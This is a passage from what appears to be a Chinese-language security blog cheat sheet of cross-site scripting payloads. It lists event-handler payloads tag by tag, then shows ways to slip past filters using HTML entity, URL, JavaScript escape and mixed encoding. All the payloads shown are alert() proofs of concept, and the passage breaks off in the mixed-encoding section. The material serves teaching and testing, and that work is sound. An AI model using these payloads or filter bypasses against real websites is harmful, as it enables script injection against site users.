class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/video&gt;<br>&lt;video controls <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;/video&gt;<br>&lt;video controls <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/video&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x06-标签"><a href="#0x06-标签" class="headerlink" title="0x06.  标签"></a>0x06. <svg> 标签</h3></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="0x07-标签"><a href="#0x07-标签" class="headerlink" title="0x07.  标签"></a>0x07. <button> 标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">onclick</span>=alert(1)&gt;<br>&lt;button <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;xss&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">onmouseup</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">onmousedown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/button&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x08-标签"><a href="#0x08-标签" class="headerlink" title="0x08. 标签"></a>0x08. <div>标签</h3></blockquote><p>这个需要借助url编码来实现绕过</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">原代码：<br>&lt;div onmouseover=&#x27;alert(<span class="hljs-number">1</span>)&#x27;&gt;DIV&lt;/div&gt;<br>经过url编码：<br>&lt;div onmouseover%3d&#x27;alert%26lpar%<span class="hljs-number">3b1</span>%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x09-标签"><a href="#0x09-标签" class="headerlink" title="0x09. 标签"></a>0x09. <object>标签</h3></blockquote><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;<span class="hljs-keyword">object</span> <span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;&lt;/<span class="hljs-keyword">object</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x10-标签"><a href="#0x10-标签" class="headerlink" title="0x10.  标签"></a>0x10. <script> 标签</h3></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="0x11-标签"><a href="#0x11-标签" class="headerlink" title="0x11.  标签"></a>0x11. <p> 标签</h3></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseup</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="0x12-标签"><a href="#0x12-标签" class="headerlink" title="0x12.  标签"></a>0x12. <input> 标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeypress</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x13-标签"><a href="#0x13-标签" class="headerlink" title="0x13. 标签"></a>0x13. <details>标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/details&gt;<br>&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">open</span>=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;/details&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x14-标签"><a href="#0x14-标签" class="headerlink" title="0x14.  标签"></a>0x14. <select> 标签</h3></blockquote><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&lt;<span class="hljs-keyword">select</span> onfocus=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> autofocus&gt;&lt;/<span class="hljs-keyword">select</span>&gt;<br>&lt;<span class="hljs-keyword">select</span> onmouseover=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/<span class="hljs-keyword">select</span>&gt;<br>&lt;<span class="hljs-keyword">select</span> onclick=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>)&gt;&lt;/<span class="hljs-keyword">select</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x15-标签"><a href="#0x15-标签" class="headerlink" title="0x15.  标签"></a>0x15. <form> 标签</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=submit&gt;&lt;/form&gt; &lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=submit&gt;&lt;/form&gt; &lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseup</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=submit&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="0x16-标签"><a href="#0x16-标签" class="headerlink" title="0x16.  标签"></a>0x16. <body> 标签</h3></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;<span class="hljs-keyword">body</span> onload=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/<span class="hljs-keyword">body</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="二、xss-常见绕过"><a href="#二、xss-常见绕过" class="headerlink" title="二、xss 常见绕过"></a>二、xss 常见绕过</h2><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>浏览器对 XSS 代码的解析顺序为：<strong>HTML解码 —— URL解码 —— JS解码(只支持UNICODE)</strong>。</p><h3 id="0x01-html-实体编码"><a href="#0x01-html-实体编码" class="headerlink" title="0x01. html 实体编码"></a>0x01. html 实体编码</h3><p><strong>当可控点为单个标签属性时，可以使用 html 实体编码。</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;test&lt;/a&gt;<br><br>&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;test&lt;iframe&gt;<br>&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>Payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>十进制</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>十六进制</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x3a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6c;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>可以不带分号</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;a href=<span class="hljs-string">&quot;&amp;<span class="hljs-subst">#x6a</span>&amp;<span class="hljs-subst">#x61</span>&amp;<span class="hljs-subst">#x76</span>&amp;<span class="hljs-subst">#x61</span>&amp;<span class="hljs-subst">#x73</span>&amp;<span class="hljs-subst">#x63</span>&amp;<span class="hljs-subst">#x72</span>&amp;<span class="hljs-subst">#x69</span>&amp;<span class="hljs-subst">#x70</span>&amp;<span class="hljs-subst">#x74</span>&amp;<span class="hljs-subst">#x3a</span>&amp;<span class="hljs-subst">#x61</span>&amp;<span class="hljs-subst">#x6c</span>&amp;<span class="hljs-subst">#x65</span>&amp;<span class="hljs-subst">#x72</span>&amp;<span class="hljs-subst">#x74</span>&amp;<span class="hljs-subst">#x28</span>&amp;<span class="hljs-subst">#x31</span>&amp;<span class="hljs-subst">#x29</span>&quot;</span>&gt;test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p><strong>可以填充0</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;a href=<span class="hljs-string">&quot;&amp;<span class="hljs-subst">#x006a</span>&amp;<span class="hljs-subst">#x0061</span>&amp;<span class="hljs-subst">#x0076</span>&amp;<span class="hljs-subst">#x0061</span>&amp;<span class="hljs-subst">#x0073</span>&amp;<span class="hljs-subst">#x0063</span>&amp;<span class="hljs-subst">#x0072</span>&amp;<span class="hljs-subst">#x0069</span>&amp;<span class="hljs-subst">#x0070</span>&amp;<span class="hljs-subst">#x0074</span>&amp;<span class="hljs-subst">#x003a</span>&amp;<span class="hljs-subst">#x0061</span>&amp;<span class="hljs-subst">#x006c</span>&amp;<span class="hljs-subst">#x0065</span>&amp;<span class="hljs-subst">#x0072</span>&amp;<span class="hljs-subst">#x0074</span>&amp;<span class="hljs-subst">#x0028</span>&amp;<span class="hljs-subst">#x0031</span>&amp;<span class="hljs-subst">#x0029</span>&quot;</span>&gt;test&lt;/a&gt;<br></code></pre></td></tr></table></figure><h3 id="0x02-url-编码"><a href="#0x02-url-编码" class="headerlink" title="0x02. url 编码"></a>0x02. url 编码</h3><p><strong>当注入点存在 href 或者 src 属性时，可以使用 url 编码。</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;a href=<span class="hljs-string">&quot;javascript:<span class="hljs-variable">%6</span>1%6c<span class="hljs-variable">%6</span>5<span class="hljs-variable">%7</span>2<span class="hljs-variable">%7</span>4<span class="hljs-variable">%2</span>8<span class="hljs-variable">%3</span>1<span class="hljs-variable">%29</span>&quot;</span>&gt;test&lt;<span class="hljs-regexp">/a&gt;</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/i</span>frame&gt;<br></code></pre></td></tr></table></figure><p><strong>可以二次编码</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;a href=<span class="hljs-string">&quot;javascript:<span class="hljs-variable">%256</span>1<span class="hljs-variable">%25</span>6c<span class="hljs-variable">%256</span>5<span class="hljs-variable">%257</span>2<span class="hljs-variable">%257</span>4<span class="hljs-variable">%252</span>8<span class="hljs-variable">%253</span>1<span class="hljs-variable">%2529</span>&quot;</span>&gt;test&lt;<span class="hljs-regexp">/a&gt;</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/i</span>frame&gt;<br></code></pre></td></tr></table></figure><h3 id="0x03-js-编码"><a href="#0x03-js-编码" class="headerlink" title="0x03. js 编码"></a>0x03. js 编码</h3><blockquote><p><strong>解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</strong></p></blockquote><p><strong>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</strong></p><p><strong>js 编码策略：</strong></p><ol><li>&quot;&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 &quot;&lt;&quot; 编码为 &quot;\074&quot;</li><li>&quot;\x&quot; 加上两个十六进制数字，如果个数不够，前面补0，例如 &quot;&lt;&quot; 编码为 &quot;\x3c&quot;</li><li>&quot;\u&quot; 加上四个十六进制数字，如果个数不够，前面补0，例如 &quot;&lt;&quot; 编码为 &quot;\u003c&quot;</li><li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;<br><br>&lt;input <span class="hljs-attribute">onfocus</span>=location=&quot;可控点&quot; autofocus&gt; <br></code></pre></td></tr></table></figure><p><strong>Payload</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><br>&lt;input <span class="hljs-attribute">onfocus</span>=location=&quot;alert(1)&quot; autofocus&gt; <br></code></pre></td></tr></table></figure><p><strong>Unicode 编码</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">&lt;</span>img src<span class="hljs-operator">=</span>x onerror<span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>0061<span class="hljs-char escape_">\u</span>006c<span class="hljs-char escape_">\u</span>0065<span class="hljs-char escape_">\u</span>0072<span class="hljs-char escape_">\u</span>0074(1)&quot;</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-operator">&lt;</span>input onfocus<span class="hljs-operator">=</span>location<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript:<span class="hljs-char escape_">\u</span>0061<span class="hljs-char escape_">\u</span>006C<span class="hljs-char escape_">\u</span>0065<span class="hljs-char escape_">\u</span>0072<span class="hljs-char escape_">\u</span>0074<span class="hljs-char escape_">\u</span>0028<span class="hljs-char escape_">\u</span>0031<span class="hljs-char escape_">\u</span>0029&quot;</span> autofocus<span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>注：</strong></p><blockquote><p>**Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 &quot;1&quot; 进行编码，框号编码后会被当成文本字符，不能执行。**<strong>ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。例如 eval(&quot;alert(1)&quot;)，可以对 &quot;alert(1)&quot; 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。</strong></p></blockquote><p><strong>八进制和十六进制</strong></p><p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p><p>语法：<code>setTimeout(要执行的代码, 等待的毫秒数)</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">setTimeout(JavaScript 函数, 等待的毫秒数)<br><span class="hljs-number">1</span>.<span class="hljs-operator">&lt;</span>svg<span class="hljs-operator">/</span>onload<span class="hljs-operator">=</span>setTimeout(&#x27;\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;)<span class="hljs-operator">&gt;</span><br><span class="hljs-number">2</span>.<span class="hljs-operator">&lt;</span>svg<span class="hljs-operator">/</span>onload<span class="hljs-operator">=</span>setTimeout(&#x27;\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>\<span class="hljs-number">145</span>\<span class="hljs-number">162</span>\<span class="hljs-number">164</span>\<span class="hljs-number">050</span>\<span class="hljs-number">061</span>\<span class="hljs-number">051</span>&#x27;)<span class="hljs-operator">&gt;</span><br><span class="hljs-number">3</span>.<span class="hljs-operator">&lt;</span>svg<span class="hljs-operator">/</span>onload<span class="hljs-operator">=</span>setTimeout(&#x27;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&#x27;)<span class="hljs-operator">&gt;</span><br><span class="hljs-number">4</span>.<span class="hljs-symbol">&lt;script&gt;</span>eval(<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>6C<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>72<span class="hljs-char escape_">\x</span>74<span class="hljs-char escape_">\x</span>28<span class="hljs-char escape_">\x</span>31<span class="hljs-char escape_">\x</span>29&quot;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br><span class="hljs-number">5</span>.<span class="hljs-symbol">&lt;script&gt;</span>eval(<span class="hljs-string">&quot;<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>54<span class="hljs-char escape_">\1</span>45<span class="hljs-char escape_">\1</span>62<span class="hljs-char escape_">\1</span>64<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>61<span class="hljs-char escape_">\0</span>51&quot;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br><span class="hljs-number">6</span>.<span class="hljs-symbol">&lt;script&gt;</span>eval(<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>0061<span class="hljs-char escape_">\u</span>006C<span class="hljs-char escape_">\u</span>0065<span class="hljs-char escape_">\u</span>0072<span class="hljs-char escape_">\u</span>0074<span class="hljs-char escape_">\u</span>0028<span class="hljs-char escape_">\u</span>0031<span class="hljs-char escape_">\u</span>0029&quot;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-混合编码"><a href="#0x04-混合编码" class="headerlink" title="0x04. 混合编码"></a>0x04. 混合编码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>html 编码</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span 